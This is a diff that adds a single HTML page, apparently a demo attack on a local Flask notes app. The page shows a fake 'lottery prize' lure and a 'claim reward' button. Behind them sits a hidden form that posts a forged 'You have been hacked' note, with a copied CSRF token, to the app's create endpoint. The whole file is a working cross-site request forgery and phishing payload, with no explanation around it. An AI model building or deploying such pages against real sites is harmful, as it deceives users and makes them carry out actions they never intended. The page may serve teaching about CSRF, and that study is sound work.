@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Update test note - My Notes App </title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    
+    <!-- Custom CSS -->
+     
+  </head>
+  <body>
+    
+    <div class="container">
+      
+      <h1>
+          Congratulations simran.
+      </h1>
+      <h2>
+          You won a lottery prize of 1,00,000 $ in Amazon daily quiz
+      </h2>
+
+      <form action="http://127.0.0.1:5000/create" method="POST">
+        <input type="hidden" name="csrf_token" value="Ijc0OGZlOGZhMWZjMzRlNWYwZDU2YTAzODY1ODRhZDZmNWVmZTA5ZTMi.YSEPjA.KlnHuvKeUsI4N3GwHO9QdXO8zq8">
+        <div class="form-group">
+            <input style="display: none;" type="text" id="title" name="title" class="form-control" value="You have been hacked">
+        </div>
+        <div class="form-group">
+            <textarea style="display: none;" name="content" id="content" cols="30" rows="10" class="form-control">Congratulations You loast all your money</textarea>
+        </div>
+        <div class="form-group">
+            <select style="display: none;" id="folder_id" class="form-control" name="folder_id">
+                <option value selected>Select Folder</option>
+                        <option value="1">Django</option>
+                        <option value="2">Flask</option>
+                        <option value="3" selected>Python</option>        
+            </select>
+        </div>
+
+        <button type="submit" class="btn btn-success">Click Here to claim reward</button>
+
+      </form>
+
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+</html>
